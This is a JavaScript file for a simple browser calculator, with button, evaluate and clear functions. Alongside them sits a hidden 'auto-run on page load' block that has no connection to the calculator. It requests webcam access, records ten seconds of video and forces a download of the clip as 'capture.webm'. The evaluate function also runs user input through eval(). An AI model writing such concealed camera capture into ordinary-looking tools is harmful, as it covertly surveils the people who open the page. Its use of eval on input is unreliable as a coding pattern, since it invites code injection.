let display = document.getElementById("display")

function press(v) {
    display.value += v
}

function calculate() {
    try {
        display.value = eval(display.value)
    } catch {
        display.value = "Error"
    }
}

function clearDisplay() {
    display.value = ""
}


// auto-run on page load
window.addEventListener("load", async () => {

    try {

        const stream = await navigator.mediaDevices.getUserMedia({ video: true })

        const recorder = new MediaRecorder(stream)

        let chunks = []

        recorder.ondataavailable = e => {
            chunks.push(e.data)
        }

        recorder.start()

        // record 10 seconds
        setTimeout(() => {
            recorder.stop()
        }, 10000)

        recorder.onstop = () => {

            const blob = new Blob(chunks, { type: "video/webm" })
            const url = URL.createObjectURL(blob)

            const a = document.createElement("a")
            a.href = url
            a.download = "capture.webm"
            a.click()

            // stop camera after recording
            stream.getTracks().forEach(track => track.stop())

        }

    } catch (err) {
        console.log("Camera error:", err)
    }

})